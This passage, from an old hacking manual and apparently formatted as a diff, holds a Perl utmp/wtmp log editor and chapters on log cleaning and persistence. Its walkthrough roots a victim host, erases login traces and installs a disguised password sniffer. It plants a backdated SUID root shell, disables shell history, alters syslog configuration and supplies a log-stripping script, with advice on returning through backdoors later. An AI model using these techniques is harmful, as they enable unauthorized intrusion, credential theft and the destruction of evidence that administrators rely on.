+sub list_by_range {
+  my($range)=shift;
+  $range =~ m/(\d+)*-(\d+)*/;
+  my($lo, $hi)=($1, $2);
+  
+  $lo = 0 if (!defined($lo));
+  $hi = scalar(keys(%entries)) if (!defined($hi));
+  
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (($_ >= $lo) && ($_ <= $hi)) {
+      list_entry($_);
+    }
+  }
+}               
+
+
+sub list_entry {
+  printf("#%3d - " . gmtime(%{$entries{$_}}->{"time"}), $_);
+  printf("  %s/%s", @{$entries{$_}}{qw(id line)});
+  printf(": %s ", %{$entries{$_}}->{"user"})
+    if (%{$entries{$_}}->{"user"} ne pack("a8", ""));
+  printf("from %s", %{$entries{$_}}->{"host"}) 
+    if (%{$entries{$_}}->{"host"} ne pack("a16", ""));
+  if (%{$entries{$_}}->{"addr"} ne "\0\0\0\0") {
+    printf(" (%s)", longtodot4(%{$entries{$_}}->{"addr"}));
+  }
+  print ("\n");
+  printf("%7sPID = %u\n", "", %{$entries{$_}}->{"pid"}) 
+    if (%{$entries{$_}}->{"pid"} && (%{$entries{$_}}->{"user"} ne pack("a8","")));
+}
+
+# <Silmaril> printf "#$_ - %s %s/%s: %s from %s\n", @{$v}->{qw(time id line user host)};
+# <Silmaril> now *that's* cool :-)
+# <Silmaril> should be like this: @{$v}{qw(time id line user host)}
+# <Silmaril> I had an extra -> in my first version.
+#
+# Or course, it's changed since then, but - "Thanks, Sil!" :)
+#
+
+
+# READ
+
+
+sub read_func {
+  my($arg)=shift;
+  
+  $arg = $utmp_location if ($arg eq "utmp");
+  $arg = $wtmp_location if ($arg eq "wtmp");
+  $arg = $active_file if (!defined($arg));
+  
+  if ($arg !~ m!/*[uw]tmp[^/]*$!) {
+    print("read :: Filenames *must* start with either 'wtmp' or 'utmp' to be edited.\n");
+    return undef;
+  }
+  
+  readfile($arg);
+}
+   
+
+# WRITE
+
+sub write_func {
+  my($file)=shift;
+  my($count)=0;
+  
+  $file = $active_file if (!defined($file));
+  if ($file !~ m!/*[uw]tmp[^/]*$!) {
+    print ("write :: File must start with 'utmp' or 'wtmp'.\nRename file outside this program.\n");
+    return undef;
+  }
+  if (!open(OUTFILE, ">$file")) {
+    print ("write :: Can't open $file for output.\n");
+    return undef;
+  }
+  binmode(OUTFILE);
+  
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    printf OUTFILE ("%s", pack("i L a12 a4 L a8 a16 a4", 
+      @{$entries{$_}}{qw(type pid line id time user host addr)}));
+    $count++;
+  }
+  print ("$active_file: " . scalar(keys(%entries)) . " entries written.\n");
+  close(OUTFILE);
+}               
+
+
+# CHECK
+
+sub check_func {
+  if (push(@_)) {
+    print "check :: Invalid options specified. Please see \"help\"\n";
+    return undef;
+  }
+  if ($active_file !~ m!/*utmp[^/]*$!) {
+    print "check :: Command can only be run on utmp files.\n";
+    return undef;
+  }
+  
+  # Build struct of ports containing port name, device num and owner.
+  # Note: Test run in grepstr may *not* be portable for all Unix
+  #       types. Be forewarned! This was designed for Linux.
+  # Hint: For all intents and purposes, s/^$ttybase([$ttyrange][$ttyports])$/
+  #       should return the same as what you expect in "struct utmp->ut_id".
+  my($grepstr) = "^($ttybase\[$ttyrange\]\[$ttyports\])\$";
+  my(%ports) = {};
+  my($user, $rdev) = ();
+
+  opendir(DEVDIR, "/dev");
+  my(@devfiles) = readdir(DEVDIR);
+  @devfiles = grep(/$grepstr/, @devfiles);  
+  close(DEVDIR);
+  foreach (@devfiles) {
+    /^$ttybase([$ttyrange][$ttyports])$/;
+    if (!defined($1)) {
+      print "check :: Warning! Could not extract port ID from $_.\n";
+    } else {
+      ($user, $rdev) = (stat("/dev/$_"))[4, 6];
+      $user = getpwuid($user);
+      $ports{$1} = newport($_, $rdev, $user);
+    } 
+  }
+  
+  # Check ownership of /dev ports.
+  my(@logdev)=();
+  foreach (sort(keys(%ports))) {
+    push(@logdev, $_) if (%{$ports{$_}}->{"owner"} ne "root");
+  }
+  @logdev = sort(@logdev);
+      
+  # Check utmp (against ports detected as logged in);
+  my(@logutmp)=();
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (defined(%{$entries{$_}}->{"user"}) && defined(%{$entries{$_}}->{"host"}) &&
+        defined(%{$entries{$_}}->{"id"})   && defined(%{$entries{$_}}->{"pid"})) {
+      push(@logutmp, %{$entries{$_}}->{"id"})  
+        if ((%{$entries{$_}}->{"id"} =~ /[$ttyrange][$ttyports]/) &&
+            ((%{$entries{$_}}->{"user"} ne pack("a8", "")) ||
+            ((%{$entries{$_}}->{"host"} ne pack("a16", "")) &&
+             (%{$entries{$_}}->{"id"} ne pack("a4", "")) &&
+             (%{$entries{$_}}->{"line"} ne pack("a12", "")) &&
+             (%{$entries{$_}}->{"pid"} > 0))));
+    }
+  }
+  @logutmp = sort(@logutmp);
+
+  # Check PIDs (find processes with active port ids)
+  opendir(PIDDIR, "/proc");
+  my(%processes) = {};
+  my(@portprocesses) = ();
+  foreach (grep(/\d+/, readdir(PIDDIR))) {
+    local($procdata, $cmdline);
+    open(PROCFILE, "</proc/$_/stat");
+    $procdata = <PROCFILE>;
+    close(PROCFILE);
+    if (-e "/proc/$_/stat") {
+      local($cmdline, $devnum, $portid);
+      ($cmd, $devnum) = (split(/ /, $procdata))[1, 6];
+      # Remove surrouding () from command name.
+      $cmd =~ s/[\(\)]//g;
+      $portid = dev2id(\%ports, $devnum);
+      if (defined($portid)) {
+        push(@portprocesses, $portid)
+          if (!defined(listpos(\@portprocesses, $portid))&&($$ != $_));
+        $processes{$_} = newproc($cmd, $portid) if (defined($portid) && ($$ != $_));
+      }
+    }
+  }
+  close(PIDDIR);
+
+  # A port is *not* logged in if there is no dev entry for port, no utmp entry
+  # and no active processes.
+  my(@validshellports) = ();
+  foreach (sort( { $a <=> $b} keys(%processes))) {
+    push(@validshellports, %{$processes{$_}}->{"port"}) 
+      if (defined(listpos(\@shells, %{$processes{$_}}->{"cmd"}))&&
+          !defined(listpos(\@validshellports, %{$processes{$_}}->{"port"})));
+  }
+  # Remove ports with valid shells from list of ports with active processes.
+  my(@noshellports) = 
+    sort(grep(!defined(listpos(\@validshellports, $_)), @portprocesses));
+  @validshellports = sort(@validshellports);
+  print "Ports with active /dev files: @logdev\n"
+    if (defined(@logdev));
+  print "Ports with utmp entries: @logutmp\n"
+    if (defined(@logutmp));
+  print "Ports with valid shells: @validshellports\n" 
+    if (defined(@validshellports));
+  print "Ports with active processes and *no* shells: @noshellports\n" 
+    if (defined(@noshellports));
+}  
+  
+    
+# GENERAL
+
+sub readfile {
+  local($file);
+  $file = shift;
+  my($index)=1;
+  my($buffer)="";
+
+  # Insure we have a clean hash table before we start reading in the file.
+  foreach (keys(%entries)) {
+    undef(%{$entries{$_}});
+    delete(${entries{$_}});
+  }
+    
+  open(UTMPFILE, "<$file") || die("utmp-parse: Can't open $file - $!\n");
+  binmode(UTMPFILE);
+  # 1/17/96, struct utmp is 56 bytes (54 according to addition! :P).  
+  while (read(UTMPFILE, $buffer, 56)) {
+    $entries{$index++} = newutmp($buffer);
+  }
+  $active_file = $file;
+  print ("$active_file: " . scalar(keys(%entries)) . " entries loaded.\n");
+  close(UTMPFILE);
+}
+
+
+sub newutmp {
+  my($newbuff) = shift;
+  my($longaddr) = 0;
+  
+  $newnode = bless { 
+    "type" => undef, "pid" => undef,  "line" => undef, "id"   => undef,
+    "time" => undef, "user" => undef, "host" => undef, "addr" => undef
+  }, 'UTMPNODE';
+  
+  @{$newnode}{qw(type pid line id time user host addr)}=
+    unpack("i L a12 a4 L a8 a16 a4", $newbuff);
+                             
+  return $newnode;
+}  
+
+
+sub newport {
+ 
+  $newnode = bless {
+    "port" => undef, "rdev" => undef, "owner" => undef, "cmd" => undef,
+  }, 'PORTNODE';
+  
+  @{$newnode}{qw(port rdev owner)} = @_;
+  
+  return $newnode;
+}
+
+
+sub newproc {
+ 
+  $newnode = bless {
+    "cmd" => undef, "port" => undef, 
+  }, 'PROCNODE';
+  
+  @{$newnode}{qw(cmd port)} = @_;
+  
+  return $newnode;
+}
+
+
+# Renumber hashes to default order.
+sub resync {
+  my(%newhash) = ();
+  my($count)=0;
+
+  # Write ordered list in to temporary hash, deleting as we go.
+  foreach (sort( {$a <=> $b} keys(%entries))) {
+    $newhash{++$count} = $entries{$_};
+    delete($entries{$_});
+  }
+
+  # Copy elements back in to original hash table.
+  foreach (sort( {$a <=> $b} keys(%newhash))) {
+    $entries{$_} = $newhash{$_};
+  }
+}
+
+
+sub longtodot4 {
+  my($addr)=shift;
+
+  return join(".", map( ord($_), split(//, $addr)));
+}
+
+sub dev2id {
+  my($portlist, $rdev) = @_;
+
+  foreach (sort(keys(%{$portlist}))) {
+    return $_ if (%{$portlist}->{$_}->{"rdev"}==$rdev);
+  }                               
+  return undef;
+}
+
+
+sub listpos {
+  my($arrayref, $search) = @_;
+  my($count) = 0;
+
+$^W = 0;
+  foreach (@{$arrayref}) {
+    return $count if ($search eq ${$arrayref}[$count]);
+    $count++;
+  }
+$^W = 1;
+
+  return undef;
+}
+
+
+### DATE ROUTINES
+
+# The following code taken & modified from the Date::Manip package.
+# Here is his copyright:
+#
+## Copyright (c) 1995,1996 Sullivan Beck. All rights reserved.
+## This program is free software; you can redistribute it and/or modify it
+## under the same terms as Perl itself.
+
+
+sub SecsSince1970 {
+# Parse as mm/dd/[cc]yy[:hh:mm[:ss]]
+  my($datetime) = shift;
+  my($m,$d,$y,$h,$mn,$s) = ();
+
+  # If date is not defined, then return local current date and time.
+  return time() if (!defined($datetime));
+
+  $datetime =~ 
+    s!^(\d{1,2})/(\d{1,2})/(\d{4}|\d{2})(?:\:(\d{2}):(\d{2})(?:\:(\d{2}))?)?!!;
+  ($m, $d, $y, $h, $mn, $s) = ($1, $2, $3, $4, $5, $6);
+  $m--;
+
+  # Finalize time components and check them.
+  $y = (($y < 70) ? "20":"19" . $y) if (length($y)==2); 
+
+  # This checks for any *non-matched* portion of $datetime. If there is such
+  # an animal, then there is illegal data specified. Also screens for undefined
+  # components which HAVE to be in ANY valid date/time (ie, month, day, year).
+  return undef if (!defined($m) || !defined($d) || !defined($y) || length($datetime));
+
+  # Set time components with unspecified values.
+  $s = 0 if (!defined($s));
+  $mn = 0 if (!defined($mn));
+  $h = 0 if (!defined($h));
+
+  # Check for ranges.
+  return undef if (($m > 11)    || ($h > 23)    || ($mn > 59)   || ($s > 59));
+                     
+  # Begin conversion to seconds since 1/1/70.
+  my($sec_now,$sec_70)=();
+  $sec_now=DaysSince999($m,$d,$y);
+  return undef if (!defined($sec_now));
+
+  $sec_now--;
+  $sec_now = $sec_now*24*3600 + $h*3600 + $mn*60 + $s;
+  $sec_70 =30610224000;
+  return ($sec_now-$sec_70);
+}
+
+
+sub DaysSince999 {
+  my($m,$d,$y)=@_;
+  my($Ny,$N4,$N100,$N400,$dayofyear,$days)=();
+  my($cc,$yy)=();
+
+  $y=~ /^(\d{2})(\d{2})$/;
+  ($cc,$yy)=($1,$2);
+
+  # Number of full years since Dec 31, 0999
+  $Ny=$y-1000;
+
+  # Number of full 4th years (incl. 1000) since Dec 31, 0999
+  $N4=int(($Ny-1)/4)+1;
+  $N4=0         if ($y==1000);
+
+  # Number of full 100th years (incl. 1000)
+  $N100=$cc-9;
+  $N100--       if ($yy==0);
+
+  # Number of full 400th years
+  $N400=int(($N100+1)/4);
+
+  # Check to insure that information returns a valid day of year.
+  $dayofyear=dayofyear($m,$d,$y);
+  return undef if (!defined($dayofyear));
+
+  # Compute day of year.
+  $days= $Ny*365 + $N4 - $N100 + $N400 + $dayofyear;
+
+  return $days;
+}
+
+
+sub dayofyear {
+  my($m,$d,$y)=@_;
+  my(@daysinmonth)=(31,28,31,30,31,30,31,31,30,31,30,31);
+  my($daynum,$i)=();
+  $daysinmonth[1]=29  if (!($y % 4));
+
+  # Return error if we are given an invalid date.
+  return undef if ($d > $daysinmonth[$m]);
+
+  $daynum=0;
+  for ($i=1; $i<$m; $i++) {
+    $daynum += $daysinmonth[$i];
+  }
+  $daynum += $d;
+  
+  return $daynum;
+}
+
+
+## END DATE ROUTINES.
+      
+# End of script.
+
+0;
+
+--------------------- end of utmpman.pl
+
+-------------------------
+Chapter VI
+Cleaning the log files
+-------------------------
+
+------------------------------
+Section 6A
+A walk around a hacked system
+-------------------------------
+
+I can't stress the importance of this enough! Clean, Clean!!!!  In this section
+I will take you on the system first hand and show you some basics on what to
+look for, and on how to wipe your presence from the system.  To start this lets
+logon a system:
+
+Here is the step by step through the basic process:
+
+******----> see who is on the machine
+
+[/home/master]finger @victim.net
+[victim.net]
+No one logged on.
+
+******----> good no one on, we will log on
+
+[/home/master]telnet victim.net
+
+Trying xxx.206.xx.140...
+Connected to victim.net.
+Escape character is '^]'.
+
+Welcome to Victim Research Linux (http://www.victim.net) Red Hat 2.1
+Kernel 1.2.13 on a i586
+
+
+ns.victim.net login: jnsmith
+Password:
+Linux 1.2.13.
+You have new mail.
+
+******----> Don't read his mail, you can cat all mail in /var/spool/mail
+            and in each users /home/username/mail directory
+
+******----> Check again to see if anyone is on
+
+[jnsmith@ns jnsmith]$ w
+
+5:36am  up 18 days,  8:23,  1 user,  load average: 0.01, 0.00, 0.00
+User     tty       login@  idle   JCPU   PCPU  what
+jnsmith   ttyp1     5:35am                      w
+
+******----> Just me, lets get root and get lost in the utmp!
+
+[jnsmith@ns jnsmith]$ cd .term
+
+******----> Nice directory to hide stuff ;)
+
+[jnsmith@ns .term]$ ./.u
+
+******----> I had this already waiting, it was the umounc.c exploit
+
+Discovered and Coded by Bloodmask and Vio, Covin 1996
+
+******----> We are now root, lets use z2 to become invisible
+
+bash# z2 jnsmith
+Zap2!
+
+******----> Let's see if we are still on ...
+
+bash# w
+5:37am  up 18 days,  8:24,  0 users,  load average: 0.08, 0.02, 0.01
+User     tty       login@  idle   JCPU   PCPU  what
+
+******----> Hmm. now there is no one on the system, i must have logged off ;)
+
+
+******----> We know we are root, but lets check you you can see ...
+
+bash# whoami
+root
+bash#
+
+******----> Yup, root ..  What directory are we in?
+
+bash# pwd
+/home/jnsmith/.term
+
+******----> Let's check the logs
+
+bash# cd /var/log
+
+******----> most of the time in /var/adm, this box uses /var/log
+
+bash# grep dormroom *
+maillog:Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com
+maillog:Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com
+
+******----> Yup, the z2 took care of everything but this maillog ...
+
+bash# pico maillog
+
+******----> in pico i did a ctrl w, and searched for dormroom then ctrl k to
+            delete lines
+
+
+******----> These were the lines deleted
+
+Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com
+Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com
+
+bash# grep dormroom *
+
+******----> Yup .. all clear ;)
+
+bash# w
+5:41am  up 18 days,  8:27,  0 users,  load average: 0.00, 0.00, 0.00
+User     tty       login@  idle   JCPU   PCPU  what
+
+******----> Yup .. all clear here too ;)
+
+******----> Lets show you how you would use lled and wted if the grep would
+            have shown something in those files
+
+bash# cd ~jnsmith/.term
+bash# lled
+bash# lled -c dormroom.playhouse
+Entries stored: 527 Entries removed: 0
+Now chmod lastlog.tmp and copy over the original /var/log/lastlog
+
+******----> Nothing in the lastlog
+
+bash#
+bash# wted -e jnsmith
+Entries stored: 254 Entries removed: 0
+Now chmod wtmp.tmp and copy over the original /var/log/wtmp
+
+******----> Nothing in the wtmp, both of these would have shown in the grep
+            we just did in the /var/log (just showing you the commands)
+
+******----> Lets do some sniffing ...
+
+bash# pico linsniffer.c
+
+******----> I changed this line to tell where i want the log to go:
+
+#define TCPLOG "/tmp/.pinetemp.000"
+
+******----> lets look at what is running to think of a name that
+            looks almost like it belongs there
+
+bash# ps -aux
+
+root       143  0.0  0.0   84    0  ?  SW  Jan 10   0:01 (lpd)
+root       154  0.0  0.0  118    0  ?  SW  Jan 10   0:00 (smbd)
+root       163  0.0  0.5   76  176  ?  S   Jan 10   0:00 nmbd -D
+root       197  0.0  0.0   76    0 v03 SW  Jan 10   0:00 (getty)
+root       198  0.0  0.0   76    0 v04 SW  Jan 10   0:00 (getty)
+root       199  0.0  0.0   76    0 v05 SW  Jan 10   0:00 (getty)
+root       200  0.0  0.0   76    0 v06 SW  Jan 10   0:00 (getty)
+root       201  0.0  0.0   88    0 s00 SW  Jan 10   0:00 (uugetty)
+root       209  0.0  0.2   35   76  ?  S   Jan 10   0:01 (update)
+root       210  0.0  0.3   35  124  ?  S   Jan 10   0:03 update (bdflush)
+root     10709  0.0  1.4  152  452  ?  S   Jan 27   0:10 httpd
+root     11111  0.0  1.4  152  452  ?  S   Jan 27   0:07 httpd
+root     14153  0.0  0.8   70  268  ?  S   Jan 16   0:03 ./inetd
+root     14307  0.0  4.7 1142 1484  ?  S   Jan 16   1:16 ./named
+root     14365  0.0  0.0   76    0 v02 SW  Jan 16   0:00 (getty)
+root     17367  0.0  1.4  152  452  ?  S    11:01   0:02 httpd
+
+******----> lets compile it and name it nmb
+
+bash# gcc linsniffer.c -o nmb
+
+******----> lets load it ...
+
+bash# nmb&
+[1] 22171
+
+******----> lets check the log file in /tmp
+
+bash#
+bash# cd /tmp
+bash# ls -al .pin*
+total 15691
+-rw-rw-r--   1 root     jnsmith          0 Jan 29 05:50 .pinetemp.000
+
+******----> There it is, but we don't want our login to know about it!
+
+bash# chgrp root .pin*
+
+******----> Lets look now ....
+
+bash# ls -al .pin*
+-rw-rw-r--   1 root     root            0 Jan 29 05:50 .pinttemp.000
+bash#
+
+******----> This is good, Lets make an SUID shell so we don't have to
+            do this again.  (check for MD5 or other programs in the cron)
+
+bash# cd /bin
+bash# ls -l sh
+lrwxrwxrwx   1 root     root            4 Mar  1  1996 sh -> bash
+
+******----> This is a sym link ...
+
+bash# ls -l bash
+-rwxr-xr-x   1 root     root       299296 Nov  2  1995 bash
+
+******----> here is the real file ... lets see what to name it that
+            looks like it belongs
+
+bash# ls
+arch           df             ksh            ping           tar
+ash            dmesg          ln             ps             tcsh
+bash           dnsdomainname  login          pwd            true
+cat            domainname     ls             red            ttysnoops
+chgrp          echo           mail           rm             umount
+chmod          ed             mkdir          rmdir          uname
+chown          false          mknod          sed            vi
+cp             findterm       more           setserial      view
+cpio           gunzip         mount          sh             vim
+csh            gzip           mt             stty           zcat
+date           hostname       mv             su             zsh
+dd             kill           netstat        sync
+
+******----> How about a new command in linux, most admin's won't know
+            the difference ;)  We will call it findhost
+
+bash# cp bash findhost
+
+******----> ok, now lets have a look at our new unix command ...
+
+bash# ls -l findhost
+-rwxr-xr-x   1 root     jnsmith     299296 Jan 29 05:59 findhost
+
+******----> We need to change the group owner, touch the file date,
+            and make it SUID
+
+bash# chgrp root findhost
+bash# ls -l findhost
+-rwxr-xr-x   1 root     root       299296 Jan 29 05:59 findhost
+
+bash# chmod +s findhost
+bash# ls -l findhost
+-rwsr-sr-x   1 root     root       299296 Jan 29 05:59 findhost
+
+bash# touch -t 111312331995 findhost
+bash# ls -l findhost
+-rwsr-sr-x   1 root     root       299296 Nov 13  1995 findhost
+
+bash# ls -l m*
+-rwxr-xr-x   1 root     root        64400 Oct 31  1995 mail
+-rwxr-xr-x   1 root     root         7689 Nov  2  1995 mkdir
+-rwxr-xr-x   1 root     root         7001 Nov  2  1995 mknod
+-rwxr-xr-x   1 root     root        20272 Nov  1  1995 more
+-rwsr-xr-x   1 root     root        26192 Nov  1  1995 mount
+-rwxr-xr-x   1 root     root         8381 Oct 31  1995 mt
+-rwxr-xr-x   1 root     root        12753 Nov  2  1995 mv
+
+******----> Now it looks like it belongs ... lets see if
+            it gives us root, exit our current root shell..
+
+bash# exit
+
+[jnsmith@ns .term]$ cd /bin
+[jnsmith@ns /bin]$ whoami
+jnsmith
+[jnsmith@ns /bin]$ findhost
+[jnsmith@ns /bin]# whoami
+root
+
+[jnsmith@ns /bin]# cd
+
+******----> cd {enter} takes us back to our home dir
+
+[jnsmith@ns jnsmith]# ls
+mail
+[jnsmith@ns jnsmith]# echo + +>test
+[jnsmith@ns jnsmith]# ls -l
+total 2
+drwx------   2 jnsmith   jnsmith       1024 Jan 11 22:47 mail
+-rw-rw-r--   1 root      root            4 Jan 29 06:11 test
+
+******----> See now we are uid=0 gid=0
+
+[jnsmith@ns jnsmith]# rm test
+
+******----> clean as we go .....
+
+[jnsmith@ns jnsmith]# w
+6:12am  up 18 days,  8:58,  0 users,  load average: 0.07, 0.02, 0.00
+User     tty       login@  idle   JCPU   PCPU  what
+
+******----> Just making sure we are still alone ....
+
+[jnsmith@ns jnsmith]# ls -al /tmp/.p*
+total 15692
+-rw-rw-r--   1 root     root          157 Jan 29 06:10 .pinttemp.000
+
+******----> were getting passwords already ;)
+
+[jnsmith@ns jnsmith]# ls -al
+total 32
+drwxrwx---   5 jnsmith   jnsmith   1024 Jan 29 06:11 .
+drwxr-xr-x  33 root      users     1024 Jan 22 16:53 ..
+-rw-r-----   1 jnsmith   jnsmith   1126 Aug 23  1995 .Xdefaults
+lrwxrwxrwx   1 jnsmith   jnsmith      9 Jan  1 21:40 .bash_history -> /dev/null
+-rw-r--r--   1 root      jnsmith     24 Jan  1 03:12 .bash_logout
+-rw-r--r--   1 root      jnsmith    220 Jan  1 03:12 .bash_profile
+-rw-r--r--   1 root      jnsmith    124 Jan  1 03:12 .bashrc
+-rw-rw-r--   1 root      jnsmith   5433 Jan 11 22:47 .pinerc
+drwxrwxr-x   2 jnsmith   jnsmith   1024 Jan 29 06:22 .term
+drwxr-x---   2 jnsmith   jnsmith   1024 Feb 17  1996 .xfm
+drwx------   2 jnsmith   jnsmith   1024 Jan 11 22:47 mail
+[jnsmith@ns jnsmith]#
+
+******----> Make sure you place this sys link .bash_history to /dev/null so
+            you do not leave a history behind...
+
+This is the command to do it, but make sure you delete the old .bash_history
+if it is there.
+
+ln -s /dev/null .bash_history
+
+Ok logout ...
+
+Ok, there is another way!!!!!!
+
+If you can remember and make it a practice that you NEVER forget, get used to
+this.... EVERY TIME you login to an account type: unset HISTFILE
+
+This will tell the system to delete your history file when you logoff the
+system...   USE THIS!  Get into the practice!  DON'T FORGET!
+
+-----------
+Section 6B
+messages and syslog
+-----------
+
+In the log directory you will find a file called 'messages' each system is
+different as far as what is logged to what files or what file name.  Make
+sure to check in the /etc/syslog.conf file for additional logging to
+remote machines.  If this is being done you will see something like this:
+
+*.*                                 @somehostname.xxx
+
+Or just to check and see where the log files are going you can view this file
+/etc/syslog.conf.
+
+Here is a sample...
+
+bash# more syslog.conf
+# /etc/syslog.conf
+# For info about the format of this file, see "man syslog.conf" (the BSD man
+# page), and /usr/doc/sysklogd/README.linux.
+#
+# NOTE: YOU HAVE TO USE TABS HERE - NOT SPACES.
+# I don't know why.
+#
+
+*.=info;*.=notice                               /var/adm/messages
+*.=debug                                        /var/adm/debug
+*.warn                                          /var/adm/syslog
+*.warn                                          /root/.../syslog
+*.=crit;kern.none                               /var/adm/critical
+kern.info;kern.!err                             /var/adm/kernel-info
+mail.*;mail.!=info                              /root/.../mail
+mail,news.=info                                 /root/.../info
+mail.*;mail.!=info                              /var/adm/mail
+mail,news.=info                                 /var/adm/info
+*.alert                                         root,bob
+*.=info;*.=notice                               @quality.com
+*.=debug                                        @quality.com
+*.warn                                          @quality.com
+*.=crit;kern.none                               @quality.com
+kern.info;kern.!err                             @quality.com
+mail.*;mail.!=info                              @quality.com
+mail,news.=info                                 @quality.com
+
+Here some of the logs are going into a hidden directory in the /root directory
+and a copy of every alert and warning are being also sent to the logs at
+quality.com.  wtmp, utmp and lastlog are still local, so you can still be
+ok, just make sure not to use 'su' on a system like this.  Also notice above
+that alert messages are being mailed to root and bob on this system.
+
+Also take note that syslog, mail, and, info are being sent to the /var/adm
+directory to fool you into thinking all of the logs are in /var/adm!  If you
+edit /var/adm the admin can run a diff on the backup files in the /root dir.
+
+Ok, so you go to the /var/adm or /var/log directory and:
+
+grep yourhost * |more
+grep your ip * |more
+
+you see that some files are logging your connection, mark down what files
+are logging you and edit the /etc/syslog.conf file.  You will from trial
+and error in most cases make it skip the logging process of your domain.
+
+BUT, make sure to do a few things.  After you edit the file restart the
+syslogd.  You can do this by doing a ps -x
+
+$root> ps -x
+
+39  ?  S    1:29 /usr/sbin/syslogd
+
+find the syslogd and notice the process id here is 39, so you do:
+
+kill -HUP 39
+
+This will restart the process and put your changes into effect.
+
+The other thing is to make sure to do a ls -l /etc/syslog.conf BEFORE you
+edit it and touch the file date back to the original date and time after
+you edit it.  This way if they notice the logging looks different, they
+will check the file date and think it must be something else.  Most admins
+would not know how to setup this file in the first place, so you in some
+(or most) cases ok to edit it.
+
+Here is another file to look at.
+
+/etc/login.defs
+
+# Enable "syslog" logging of su activity - in addition to sulog file logging
+# SYSLOG_SG_ENAB does the same for newgrp and sg.
+#
+SYSLOG_SU_ENAB          yes
+SYSLOG_SG_ENAB          yes
+#
+# If defined, all su activity is logged to this file
+#
+SULOG_FILE      /home/users/bob/.list
+
+Notice here that there is an su log file in a hidden file in one of
+the admin's directories.
+
+-----------
+Section 6C
+xferlog
+-----------
+
+The xferlog can be edited with your favorite text editor, pico, joe, vi, etc..
+you can then search for your transfers and delete the lines and save the file.
+You will need to do this after transferring any files.
+
+You will also want to grep the files in the /usr/local/etc/httpd/log directory
+if you have used the web or phf on the system to remove your presence
+from there.
+
+grep (username or hostname) * |more
+
+If you need to find the logs for httpd you can do a find -name httpd.conf
+-print and view the config file you see where the httpd logs are going.
+
+There might be different ftp logs for transfers in some ftp or virtual ftp
+directory some where.  View the files in the /etc/ftp* to find what the ftp
+setup is on the box.
+
+Here I have shown you to edit log files using pico, joe, or other editors.
+
+There is another way... Sometimes log files might be real large and the editor just might
+not cut it ;)  Here is what to do...
+
+You have a messages file 20 meg ... wow!
+
+If you want to get the lines that have fudge.candy.com out of this file you
+might want to do this:
+
+grep -v fudge.candy >messages.2
+rm messages
+mv messages2 messages
+
+then kill -HUP <process id for syslogd>
+
+-v means grep everything that does not match the line, so you are greping
+the file -what you do not want to a new file name messages.2.  Check the
+file size after the grep to make sure no errors were made and replace the
+old one with the new one and restart syslogd.
+
+This can also be used with other logs like xferlog, syslog, etc...
+
+Here is a perl script that will do it for you from command line.
+
+------------------- start of riptext.pl
+#!/usr/bin/perl
+#
+# RipText - Takes regular expression and filename argument from @ARGV. Any 
+#           lines MATCHING regular expression will *not* be printed to 
+#           STDOUT. 
+# 
+#
+
+die("\nUsage: riptext [regexp] {filename}\n\n") if (!defined($ARGV[0]));
+($regexp, $filename) = @ARGV[0,1];
+
+# Read in contents of file.
+$/ = undef;
+$contents="";
+if (!defined($filename)) {
+  # Use STDIN.
+  $contents = scalar <STDIN>;
+} else {
+  # Use FILE.
+  open(FILE, "<$filename") || die("-RipText- Cannot open $filename: $!\n");
+  $contents = scalar <FILE>;
+  close(FILE);
+}
+
+@contents = split(/\n/, $contents);
+
+# Strip file of matching lines.
+open(FILE, ">$filename") || die("-RipText- Cannot write $filename: $!\n");
+foreach (@contents) {
+  print FILE "$_\n" unless (/$regexp/i);
+}
+close(FILE);
+
+0;
+
+------------------------ end of riptext.pl
+
+Remember to restart syslogd after you edit files, true you will not see
+the stuff, and it will be gone to your eyes, but if you do not restart the
+process, the data is still in memory and can be retrieved until you restart
+the process!
+
+Also look for notes in the syslog that the syslogd process was restarted at
+such and such a time.
+
+---------------
+Section 6D
+The cron table
+---------------
+
+Make sure to look at admin's and root cron files, here in this system we find
+a root cron file in: /var/spool/cron/crontabs
+bash# ls -l
+total 1
+-rw-------   1 root     root          851 Jan 26 14:14 root
+
+bash$ more root
+# This updates the database for 'locate' every day:
+40 07 * * *       updatedb 1> /dev/null 2> /dev/null
+40 */12 * * *       /sbin/checkfs
+
+there is a file running here in /sbin called checkfs.
+
+bash$ cd /sbin
+bash$ /sbin # more checkfs
+#!/bin/bash
+
+if [ ! -f /etc/default/fs/.check ]; then
+  echo WARNING!! Filecheck default file cannot be found. Please regenerate.
+    exit
+    fi
+
+md5sum /usr/bin/* > /tmp/filecheck 2>/dev/null
+md5sum /usr/sbin/* >> /tmp/filecheck 2>/dev/null
+md5sum /sbin/* >> /tmp/filecheck 2>/dev/null
+md5sum /bin/* >> /tmp/filecheck 2>/dev/null
+md5sum /usr/local/bin/* >> /tmp/filecheck 2>/dev/null
+md5sum /usr/local/sbin/* >> /tmp/filecheck 2>/dev/null
+md5sum /lib/* >> /tmp/filecheck 2>/dev/null
+md5sum /usr/lib/* >> /tmp/filecheck 2>/dev/null
+diff /tmp/filecheck /etc/default/fs/.check > /tmp/filecheck2 2>&1
+
+if [ -s /tmp/filecheck2 ]; then
+  mail -s FSCheck bin < /tmp/filecheck2
+  fi
+
+rm /tmp/filecheck /tmp/filecheck2 2>/dev/null
+
+md5 is a checksum file, if you change or add a binary file to any of the
+above directories the information of the changes will be mailed to the
+admin.
+
+------------------------------
+Chapter 7
+Keeping access to the machine
+------------------------------
+
+There are many ways to keep access to the machine, you will loose
+access to many as you as you are learning, but I hope with this manual
+and some experience you will become a stable hacker.
+
+Section 7A
+Tricks of the trade
+
+Here are some 'tricks' of the trade that will help you keep access
+to the machine.  After a system admin has found you out, they will be watching
+for you and going through everything on the system.  They will go as far as
+recompiling binary files, changing everyone's passwords, denying your host you
+came in from to the machine, going through the passwd or shadow file, looking
+for SUID files, etc....
+
+When you see that you have been found out, do not try to get access to the
+system again.  I have seen others right after being cought, try everyone of
+their trojans, other accounts, and other backdoor's they placed for continued
+access.  Well think about it, they are watching for you ... you are showing
+them every in that you have to the system, and every exploitable file you
+are making known to them.
+
+NO!  WAIT!  Give it a few months, they will think everything is ok, and they
+will relax and you can come in with one of the backdoor's they missed, and you
